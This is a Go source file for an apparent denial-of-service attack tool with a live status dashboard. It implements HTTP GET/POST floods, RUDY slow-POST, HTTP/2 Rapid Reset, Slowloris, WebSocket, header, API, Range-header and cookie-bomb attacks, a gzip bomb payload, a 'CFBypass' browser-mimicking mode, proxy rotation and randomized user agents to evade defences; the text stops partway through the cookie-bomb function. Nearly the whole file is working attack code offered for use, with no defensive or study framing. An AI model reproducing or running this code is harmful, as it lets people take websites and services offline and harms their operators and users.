package main

import (
    "bufio"
    "bytes"
    "compress/gzip"
    "crypto/tls"
    "encoding/base64"
    "flag"
    "fmt"
    "io"
    "log"
    "math/rand"
    "net"
    "net/http"
    "net/url"
    "os"
    "os/exec"
    "runtime"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "time"

    "github.com/gorilla/websocket"
    "golang.org/x/net/http2"
    "golang.org/x/net/http2/hpack"
)

var defaultUserAgents = []string{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
}

var userAgents []string
var totalSent atomic.Int64
var proxyList []string
var zstdBombPayload []byte
var startTime time.Time
var statusCounts = make(map[string]int)
var statusMutex = sync.Mutex{}
var prevLines int = 0

func init() {
    if uas, err := loadUserAgents("useragent.txt"); err == nil && len(uas) > 0 {
        userAgents = uas
    } else {
        userAgents = defaultUserAgents
    }

    var buf bytes.Buffer
    gz := gzip.NewWriter(&buf)
    payload := bytes.Repeat([]byte("A"), 10*1024*1024)
    gz.Write(payload)
    gz.Close()
    zstdBombPayload = buf.Bytes()

    startTime = time.Now()
}

func loadUserAgents(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        if line := strings.TrimSpace(scanner.Text()); line != "" {
            lines = append(lines, line)
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, err
    }
    if len(lines) == 0 {
        return nil, fmt.Errorf("no user agents found in %s", filename)
    }
    return lines, nil
}

func randUA() string {
    return userAgents[rand.Intn(len(userAgents))]
}

func loadProxies(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, fmt.Errorf("open proxy file: %w", err)
    }
    defer file.Close()

    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        if line := strings.TrimSpace(scanner.Text()); line != "" {
            lines = append(lines, line)
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, fmt.Errorf("read proxy file: %w", err)
    }
    if len(lines) == 0 {
        return nil, fmt.Errorf("no proxies found in %s", filename)
    }
    return lines, nil
}

func recordStatus(code string) {
    statusMutex.Lock()
    statusCounts[code]++
    statusMutex.Unlock()
}

func getSysInfo() map[string]string {
    info := make(map[string]string)
    info["OS"] = runtime.GOOS + " " + runtime.GOARCH
    info["CPU"] = fmt.Sprintf("%d cores", runtime.NumCPU())

    if runtime.GOOS == "linux" {
        if b, err := os.ReadFile("/etc/os-release"); err == nil {
            for _, line := range strings.Split(string(b), "\n") {
                if strings.HasPrefix(line, "PRETTY_NAME=") {
                    info["OS"] = strings.Trim(strings.Split(line, "=")[1], `"`)
                    break
                }
            }
        }
        if b, err := os.ReadFile("/proc/sys/kernel/osrelease"); err == nil {
            info["Kernel"] = strings.TrimSpace(string(b))
        }
        if b, err := os.ReadFile("/proc/meminfo"); err == nil {
            lines := strings.Split(string(b), "\n")
            if len(lines) > 0 {
                info["Memory"] = strings.TrimSpace(lines[0])
            }
        }
        if out, err := exec.Command("uname", "-n").Output(); err == nil {
            info["Host"] = strings.TrimSpace(string(out))
        } else {
            info["Host"] = "Local-Machine"
        }
    } else {
        info["Host"] = "Local-Machine"
        info["Kernel"] = "N/A"
        info["Memory"] = "N/A"
    }

    info["Uptime"] = time.Since(startTime).Round(time.Second).String()
    return info
}

func drawUI(target, method, proxyFile string, workers, duration int) {
    sysInfo := getSysInfo()
    sent := totalSent.Load()
    elapsed := time.Since(startTime).Seconds()
    if elapsed < 1 {
        elapsed = 1
    }
    rps := float64(sent) / elapsed

    fmt.Print("\033[H")

    logo := []string{
        "      _,met$$$$$gg.          ",
        "    ,g$$$$$$$$$$$$$$$P.       ",
        "  ,g$$P\"     \"\"\"Y$$.\".        ",
        " ,$$P'              `$$$.     ",
        "',$$P       ,ggs.     `$$b:   ",
        "`d$$'     ,$P\"'   .    $$$    ",
        " $$P      d$'     ,    $$P    ",
        " $$:      $$.   -    ,d$$'    ",
        " $$;      Y$b._   _,d$P'      ",
        " Y$$.    `.`\"Y$$$$P\"'         ",
        " `$$b      \"-.__              ",
        "  `Y$$                        ",
        "   `Y$$.                      ",
        "     `$$b.                    ",
        "       `Y$$b.                 ",
        "          `\"Y$b._             ",
        "              `\"\"\"            ",
    }

    cReset := "\033[0m"
    cRed := "\033[31m"
    cGreen := "\033[32m"
    cYellow := "\033[33m"
    cCyan := "\033[36m"
    cMagenta := "\033[35m"
    cBold := "\033[1m"
    cDim := "\033[2m"

    proxyLabel := "DIRECT"
    if proxyFile != "" {
        proxyLabel = proxyFile
    }

    infoLines := []string{
        cBold + cGreen + sysInfo["Host"] + cReset,
        cDim + "---------------------------" + cReset,
        cBold + "OS: " + cReset + sysInfo["OS"],
        cBold + "Host: " + cReset + sysInfo["Host"],
        cBold + "Kernel: " + cReset + sysInfo["Kernel"],
        cBold + "Uptime: " + cReset + sysInfo["Uptime"],
        cBold + "CPU: " + cReset + sysInfo["CPU"],
        cBold + "Memory: " + cReset + sysInfo["Memory"],
        cDim + "---------------------------" + cReset,
        cBold + cRed + "TARGET: " + cReset + target,
        cBold + cMagenta + "METHOD: " + cReset + strings.ToUpper(method),
        cBold + cYellow + "WORKERS: " + cReset + strconv.Itoa(workers),
        cBold + cCyan + "PROXIES: " + cReset + proxyLabel,
        cDim + "---------------------------" + cReset,
        cBold + cGreen + "SENT: " + cReset + strconv.FormatInt(sent, 10),
        cBold + cCyan + "RPS: " + cReset + fmt.Sprintf("%.0f", rps),
        cDim + "---------------------------" + cReset,
        cBold + "STATUS CODES:" + cReset,
    }

    statusMutex.Lock()
    keys := make([]string, 0, len(statusCounts))
    for k := range statusCounts {
        keys = append(keys, k)
    }
    for i := 0; i < len(keys); i++ {
        for j := i + 1; j < len(keys); j++ {
            if keys[i] > keys[j] {
                keys[i], keys[j] = keys[j], keys[i]
            }
        }
    }

    for _, k := range keys {
        color := cGreen
        if k == "Err" || strings.HasPrefix(k, "4") || strings.HasPrefix(k, "5") {
            color = cRed
        } else if strings.HasPrefix(k, "3") {
            color = cYellow
        }
        infoLines = append(infoLines, color+k+cReset+": "+strconv.Itoa(statusCounts[k]))
    }
    statusMutex.Unlock()

    maxLines := len(logo)
    if len(infoLines) > maxLines {
        maxLines = len(infoLines)
    }

    for i := 0; i < maxLines; i++ {
        var l string
        if i < len(logo) {
            l += cRed + logo[i] + cReset
        } else {
            l += strings.Repeat(" ", 28)
        }
        if i < len(infoLines) {
            l += "  " + infoLines[i]
        }
        fmt.Println(l + "\033[K")
    }

    for i := maxLines; i < prevLines; i++ {
        fmt.Println("\033[K")
    }
    prevLines = maxLines
}

const (
    dialTimeout           = 5 * time.Second
    responseHeaderTimeout = 10 * time.Second
    clientTimeout         = 10 * time.Second
    keepAliveInterval     = 30 * time.Second
    idleConnTimeout       = 90 * time.Second
    maxIdleConns          = 500
    maxIdleConnsPerHost   = 250
    maxConnsPerHost       = 250
    maxClientsPerProxy    = 64
    maxDirectPool         = 256
)

func newTransport(proxyURL *url.URL) *http.Transport {
    t := &http.Transport{
        DialContext: (&net.Dialer{
            Timeout:   dialTimeout,
            KeepAlive: keepAliveInterval,
        }).DialContext,
        TLSClientConfig:       &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
        TLSHandshakeTimeout:   dialTimeout,
        MaxIdleConns:          maxIdleConns,
        MaxIdleConnsPerHost:   maxIdleConnsPerHost,
        MaxConnsPerHost:       maxConnsPerHost,
        IdleConnTimeout:       idleConnTimeout,
        ResponseHeaderTimeout: responseHeaderTimeout,
        DisableKeepAlives:     false,
        DisableCompression:    true,
        ForceAttemptHTTP2:     false,
    }
    if proxyURL != nil {
        t.Proxy = http.ProxyURL(proxyURL)
    }
    return t
}

func buildClientPool(proxies []string, workers int) ([]*http.Client, error) {
    seen := make(map[string]bool)
    var unique []string
    for _, p := range proxies {
        if !seen[p] {
            seen[p] = true
            unique = append(unique, p)
        }
    }

    clientsPerProxy := workers / len(unique)
    if clientsPerProxy < 1 {
        clientsPerProxy = 1
    }
    if clientsPerProxy > maxClientsPerProxy {
        clientsPerProxy = maxClientsPerProxy
    }
    clients := make([]*http.Client, 0, len(unique)*clientsPerProxy)

    for _, raw := range unique {
        proxyURL, err := url.Parse(raw)
        if err != nil {
            continue
        }
        for i := 0; i < clientsPerProxy; i++ {
            c := &http.Client{
                Transport: newTransport(proxyURL),
                Timeout:   clientTimeout,
                CheckRedirect: func(req *http.Request, via []*http.Request) error {
                    if len(via) >= 3 {
                        return http.ErrUseLastResponse
                    }
                    return nil
                },
            }
            clients = append(clients, c)
        }
    }
    if len(clients) == 0 {
        return nil, fmt.Errorf("no valid proxy clients built")
    }
    return clients, nil
}

func buildDirectPool(count int) []*http.Client {
    clients := make([]*http.Client, 0, count)
    for i := 0; i < count; i++ {
        c := &http.Client{
            Transport: newTransport(nil),
            Timeout:   clientTimeout,
            CheckRedirect: func(req *http.Request, via []*http.Request) error {
                if len(via) >= 3 {
                    return http.ErrUseLastResponse
                }
                return nil
            },
        }
        clients = append(clients, c)
    }
    return clients
}

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randString(n int) string {
    b := make([]byte, n)
    for i := range b {
        b[i] = charset[rand.Intn(len(charset))]
    }
    return string(b)
}

func randEmail() string {
    domains := []string{"gmail.com", "yahoo.com", "outlook.com", "proton.me", "mail.ru", "example.com"}
    return randString(8+rand.Intn(12)) + "@" + domains[rand.Intn(len(domains))]
}

func httpGet(url string, client *http.Client) error {
    resp, err := client.Get(url)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func genFormPayload() (string, string) {
    payloads := []func() string{
        func() string {
            return "username=" + randString(8+rand.Intn(16)) +
                "&password=" + randString(12+rand.Intn(20)) +
                "&email=" + randEmail() +
                "&csrf_token=" + randString(32)
        },
        func() string {
            return "search=" + randString(20+rand.Intn(200)) +
                "&category=" + randString(5) +
                "&page=" + strconv.Itoa(rand.Intn(500)) +
                "&submit=Search"
        },
        func() string {
            return "name=" + randString(10) +
                "&email=" + randEmail() +
                "&subject=" + randString(20+rand.Intn(40)) +
                "&message=" + randString(200+rand.Intn(2000)) +
                "&token=" + randString(64)
        },
        func() string {
            var sb strings.Builder
            n := 50 + rand.Intn(200)
            for i := 0; i < n; i++ {
                if i > 0 {
                    sb.WriteByte('&')
                }
                sb.WriteString(randString(3 + rand.Intn(8)))
                sb.WriteByte('=')
                sb.WriteString(randString(5 + rand.Intn(30)))
            }
            return sb.String()
        },
        func() string {
            size := 10240 + rand.Intn(40960)
            blob := make([]byte, size)
            rand.Read(blob)
            return "data=" + base64.StdEncoding.EncodeToString(blob)
        },
    }

    if rand.Intn(4) == 0 {
        jsonStr := fmt.Sprintf(
            `{"email":"%s","password":"%s","action":"login","token":"%s","data":"%s"}`,
            randEmail(), randString(16+rand.Intn(32)), randString(64), randString(200+rand.Intn(1000)),
        )
        return jsonStr, "application/json"
    }

    return payloads[rand.Intn(len(payloads))](), "application/x-www-form-urlencoded"
}

func httpPost(targetURL string, client *http.Client) error {
    body, contentType := genFormPayload()
    req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.Header.Set("Content-Type", contentType)
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

type slowReader struct {
    data  []byte
    pos   int
    delay time.Duration
    stop  <-chan struct{}
}

func (r *slowReader) Read(p []byte) (int, error) {
    select {
    case <-r.stop:
        return 0, io.EOF
    default:
    }
    if r.pos >= len(r.data) {
        r.pos = 0
    }
    p[0] = r.data[r.pos]
    r.pos++
    time.Sleep(r.delay)
    return 1, nil
}

func httpRudy(targetURL string, client *http.Client, stop <-chan struct{}) error {
    declaredSize := 1024*1024 + rand.Intn(50*1024*1024)
    chunk := []byte("comment=" + randString(50) + "&" + randString(10) + "=" + randString(20) + "&")

    slow := &slowReader{
        data:  chunk,
        delay: time.Duration(500+rand.Intn(2000)) * time.Millisecond,
        stop:  stop,
    }

    req, err := http.NewRequest("POST", targetURL, slow)
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.ContentLength = int64(declaredSize)
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")
    req.Header.Set("Connection", "keep-alive")

    rudyClient := *client
    rudyClient.Timeout = 0
    if t, ok := rudyClient.Transport.(*http.Transport); ok {
        tClone := t.Clone()
        tClone.ResponseHeaderTimeout = 0
        tClone.IdleConnTimeout = 0
        rudyClient.Transport = tClone
    }

    resp, err := rudyClient.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func httpRapidReset(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        return err
    }

    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[rand.Intn(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            return err
        }
        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            return err
        }

        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n"
        if pURL.User != nil {
            user := pURL.User.Username()
            pass, _ := pURL.User.Password()
            cred := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
            connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
        }
        connectReq += "\r\n"

        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }

        br := bufio.NewReader(rawConn)
        resp, err := http.ReadResponse(br, nil)
        if err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }
        resp.Body.Close()
        if resp.StatusCode != 200 {
            rawConn.Close()
            recordStatus("ProxyErr")
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            return err
        }
    }

    tlsConn := tls.Client(rawConn, &tls.Config{
        ServerName:         host,
        NextProtos:         []string{"h2"},
        InsecureSkipVerify: true,
    })
    if err := tlsConn.Handshake(); err != nil {
        rawConn.Close()
        recordStatus("Err")
        return err
    }
    defer tlsConn.Close()

    if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
        recordStatus("Err")
        return fmt.Errorf("h2 not negotiated")
    }

    if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
        recordStatus("Err")
        return err
    }

    bw := bufio.NewWriterSize(tlsConn, 65536)
    framer := http2.NewFramer(bw, tlsConn)
    framer.AllowIllegalWrites = true

    framer.WriteSettings(
        http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
        http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
    )
    bw.Flush()

    connDone := make(chan struct{})
    go func() {
        defer close(connDone)
        for {
            f, err := framer.ReadFrame()
            if err != nil {
                return
            }
            switch sf := f.(type) {
            case *http2.SettingsFrame:
                if !sf.IsAck() {
                    framer.WriteSettingsAck()
                    bw.Flush()
                }
            case *http2.GoAwayFrame:
                return
            }
        }
    }()

    var hdrBuf bytes.Buffer
    enc := hpack.NewEncoder(&hdrBuf)

    path := u.RequestURI()
    if path == "" {
        path = "/"
    }
    scheme := u.Scheme
    if scheme == "" || scheme == "http" {
        scheme = "https"
    }
    authority := u.Host

    var streamID uint32 = 1
    const batchSize = 100

    for {
        select {
        case <-stop:
            return nil
        case <-connDone:
            recordStatus("Err")
            return fmt.Errorf("connection closed by server")
        default:
        }

        for i := 0; i < batchSize; i++ {
            hdrBuf.Reset()
            enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
            enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
            enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
            enc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
            enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randUA()})

            if err := framer.WriteHeaders(http2.HeadersFrameParam{
                StreamID:      streamID,
                BlockFragment: hdrBuf.Bytes(),
                EndStream:     true,
                EndHeaders:    true,
            }); err != nil {
                recordStatus("Err")
                return err
            }

            if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
                recordStatus("Err")
                return err
            }

            recordStatus("RST")
            streamID += 2

            if streamID >= 1<<31-1 {
                bw.Flush()
                return nil
            }
        }
        bw.Flush()
    }
}

func wsFlood(targetURL string, stop <-chan struct{}) error {
    wsURL := targetURL
    if strings.HasPrefix(wsURL, "http://") {
        wsURL = "ws://" + wsURL[7:]
    } else if strings.HasPrefix(wsURL, "https://") {
        wsURL = "wss://" + wsURL[8:]
    } else if !strings.HasPrefix(wsURL, "ws://") && !strings.HasPrefix(wsURL, "wss://") {
        wsURL = "ws://" + wsURL
    }

    var proxyURL *url.URL
    if len(proxyList) > 0 {
        proxy := proxyList[rand.Intn(len(proxyList))]
        var err error
        proxyURL, err = url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            return err
        }
    }

    dialer := websocket.Dialer{
        HandshakeTimeout: 10 * time.Second,
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true,
        },
    }
    if proxyURL != nil {
        dialer.Proxy = func(req *http.Request) (*url.URL, error) {
            return proxyURL, nil
        }
    }

    headers := http.Header{}
    headers.Set("User-Agent", randUA())
    headers.Set("Origin", targetURL)

    conn, _, err := dialer.Dial(wsURL, headers)
    if err != nil {
        recordStatus("Err")
        return err
    }
    defer conn.Close()

    go func() {
        for {
            if _, _, err := conn.ReadMessage(); err != nil {
                return
            }
        }
    }()

    for {
        select {
        case <-stop:
            conn.WriteMessage(websocket.CloseMessage,
                websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
            return nil
        default:
        }

        var err error
        switch rand.Intn(5) {
        case 0:
            msg := fmt.Sprintf(`{"action":"%s","data":"%s","ts":%d}`,
                randString(8), randString(200+rand.Intn(2000)), time.Now().UnixNano())
            err = conn.WriteMessage(websocket.TextMessage, []byte(msg))
        case 1:
            data := make([]byte, 1024+rand.Intn(7168))
            rand.Read(data)
            err = conn.WriteMessage(websocket.BinaryMessage, data)
        case 2:
            err = conn.WriteMessage(websocket.PingMessage, []byte(randString(16)))
        case 3:
            err = conn.WriteMessage(websocket.TextMessage, []byte(randString(10240+rand.Intn(40960))))
        case 4:
            for j := 0; j < 10; j++ {
                if e := conn.WriteMessage(websocket.TextMessage, []byte(randString(16))); e != nil {
                    err = e
                    break
                }
                recordStatus("Sent")
            }
        }

        if err != nil {
            recordStatus("Err")
            return err
        }
        recordStatus("Sent")
    }
}

var apiActions = []string{"update_profile", "create_post", "send_message", "add_comment", "upload_data", "sync", "process", "validate", "register", "checkout"}
var apiEndpoints = []string{"/api/v1/users", "/api/v2/data", "/api/graphql", "/api/v1/submit", "/api/v1/auth", "/api/v1/search", "/api/v1/events", "/api/v1/webhook"}

func genAPIPayload() string {
    generators := []func() string{
        func() string {
            bioLen := 2000 + rand.Intn(8000)
            return fmt.Sprintf(
                `{"user_id":"%d","action":"%s","bio":"%s","nonce":"%s","email":"%s","display_name":"%s"}`,
                rand.Intn(9999999), apiActions[rand.Intn(len(apiActions))],
                randString(bioLen), randString(32), randEmail(), randString(12+rand.Intn(20)),
            )
        },
        func() string {
            var sb strings.Builder
            n := 500 + rand.Intn(4500)
            sb.WriteString(`{"action":"bulk_insert","token":"`)
            sb.WriteString(randString(64))
            sb.WriteString(`","items":[`)
            for i := 0; i < n; i++ {
                if i > 0 {
                    sb.WriteByte(',')
                }
                fmt.Fprintf(&sb, `{"id":%d,"name":"%s","value":"%s"}`,
                    rand.Intn(9999999), randString(8+rand.Intn(16)), randString(20+rand.Intn(100)))
            }
            sb.WriteString(`]}`)
            return sb.String()
        },
        func() string {
            depth := 20 + rand.Intn(30)
            var sb strings.Builder
            for i := 0; i < depth; i++ {
                fmt.Fprintf(&sb, `{"level_%d":{"data":"%s","nested":`, i, randString(50+rand.Intn(200)))
            }
            sb.WriteString(`{"end":true}`)
            for i := 0; i < depth; i++ {
                sb.WriteString(`}}`)
            }
            return sb.String()
        },
        func() string {
            return fmt.Sprintf(
                `{"query":"mutation { updateUser(input: $input) { id status } }","variables":{"input":{"id":"%d","name":"%s","bio":"%s","settings":{"theme":"%s","lang":"%s","notifications":%t,"data":"%s"}}}}`,
                rand.Intn(9999999), randString(16), randString(3000+rand.Intn(5000)),
                randString(8), randString(5), rand.Intn(2) == 1, randString(1000+rand.Intn(4000)),
            )
        },
        func() string {
            return fmt.Sprintf(
                `{"email":"%s","password":"%s","mfa_code":"%06d","device_id":"%s","fingerprint":"%s"}`,
                randEmail(), randString(16+rand.Intn(32)), rand.Intn(999999),
                randString(36), randString(64),
            )
        },
        func() string {
            var sb strings.Builder
            sb.WriteString(`{"action":"search","filters":{`)
            n := 20 + rand.Intn(50)
            for i := 0; i < n; i++ {
                if i > 0 {
                    sb.WriteByte(',')
                }
                fmt.Fprintf(&sb, `"%s":"%s"`, randString(5+rand.Intn(10)), randString(10+rand.Intn(100)))
            }
            sb.WriteString(fmt.Sprintf(`},"page":%d,"limit":%d,"sort":"%s"}`,
                rand.Intn(10000), 100+rand.Intn(900), randString(8)))
            return sb.String()
        },
    }
    return generators[rand.Intn(len(generators))]()
}

func httpAPIFlood(targetURL string, client *http.Client) error {
    body := genAPIPayload()
    fullURL := targetURL + apiEndpoints[rand.Intn(len(apiEndpoints))]

    req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "application/json")
    req.Header.Set("X-Request-ID", randString(32))
    req.Header.Set("Authorization", "Bearer "+randString(64))
    req.Header.Set("Origin", targetURL)

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func httpSlowloris(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[rand.Intn(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            return err
        }
        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            return err
        }
        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }
        br := bufio.NewReader(rawConn)
        resp, err := http.ReadResponse(br, nil)
        if err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }
        resp.Body.Close()
        if resp.StatusCode != 200 {
            rawConn.Close()
            recordStatus("ProxyErr")
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            return err
        }
        conn = tlsConn
    }
    defer conn.Close()

    fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", host, randUA())

    ticker := time.NewTicker(1 + time.Duration(rand.Intn(3))*time.Second)
    defer ticker.Stop()

    for {
        select {
        case <-stop:
            return nil
        case <-ticker.C:
            _, err := fmt.Fprintf(conn, "X-%s: %s\r\n", randString(5), randString(10))
            if err != nil {
                recordStatus("Err")
                return err
            }
            recordStatus("Held")
        }
    }
}

func httpHeaderFlood(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.Header.Set("User-Agent", randUA())

    numHeaders := 50 + rand.Intn(50)
    for i := 0; i < numHeaders; i++ {
        req.Header.Set("X-"+randString(8), randString(1024))
    }

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func httpMixPost(targetURL string, client *http.Client) error {
    var body string
    var contentType string
    switch rand.Intn(4) {
    case 0:
        contentType = "application/json"
        body = fmt.Sprintf(`{"data":"%s","id":%d,"token":"%s"}`, randString(500), rand.Intn(9999), randString(32))
    case 1:
        contentType = "application/xml"
        body = fmt.Sprintf(`<root><data>%s</data><id>%d</id></root>`, randString(500), rand.Intn(9999))
    case 2:
        contentType = "application/x-www-form-urlencoded"
        body = "data=" + randString(500) + "&id=" + strconv.Itoa(rand.Intn(9999))
    case 3:
        contentType = "text/plain"
        body = randString(500)
    }

    req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.Header.Set("Content-Type", contentType)
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func httpCFBypass(targetURL string, client *http.Client) error {
    sep := "?"
    if strings.Contains(targetURL, "?") {
        sep = "&"
    }
    fullURL := targetURL + sep + "q=" + randString(15) + "&p=" + strconv.Itoa(rand.Intn(9999))

    req, err := http.NewRequest("GET", fullURL, nil)
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
    req.Header.Set("Accept-Language", "en-US,en;q=0.5")
    req.Header.Set("Accept-Encoding", "gzip, deflate, br")
    req.Header.Set("Connection", "keep-alive")
    req.Header.Set("Upgrade-Insecure-Requests", "1")
    req.Header.Set("Sec-Fetch-Dest", "document")
    req.Header.Set("Sec-Fetch-Mode", "navigate")
    req.Header.Set("Sec-Fetch-Site", "none")
    req.Header.Set("Sec-Fetch-User", "?1")
    req.Header.Set("Cache-Control", "max-age=0")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func httpRangeAttack(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        return err
    }
    req.Header.Set("User-Agent", randUA())

    var ranges []string
    for i := 0; i < 100; i++ {
        ranges = append(ranges, fmt.Sprintf("0-%d", i*1000))
    }
    req.Header.Set("Range", "bytes="+strings.Join(ranges, ","))

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    return nil
}

func httpCookieBomb(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
